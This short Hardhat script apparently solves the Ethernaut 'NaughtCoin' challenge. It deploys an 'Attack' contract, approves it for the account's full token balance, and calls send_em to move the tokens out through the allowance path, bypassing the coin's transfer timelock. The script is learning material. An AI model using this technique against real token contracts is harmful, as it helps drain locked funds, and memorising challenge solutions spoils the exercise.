import { ethers } from "hardhat";
import * as helper from "./helpful_scripts";

async function main() {
    const [account] = await ethers.getSigners();

    const Naught = await helper.getContractAt("NaughtCoin", "0xF41E242F516Eb3A42f815c15dD8DCe753Fc1c332");
    const Attacker = await helper.deployContract("Attack", {
        gasLimit: 1000000
    });

    let tx = await Naught.approve(Attacker.address, Naught.balanceOf(account.address), {
        gasLimit: 1000000
    });
    await tx.wait();


    tx = await Attacker.send_em(account.address, Naught.address, {
        gasLimit: 1000000
    });
    await tx.wait();

    console.log(await Naught.balanceOf(account.address));
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });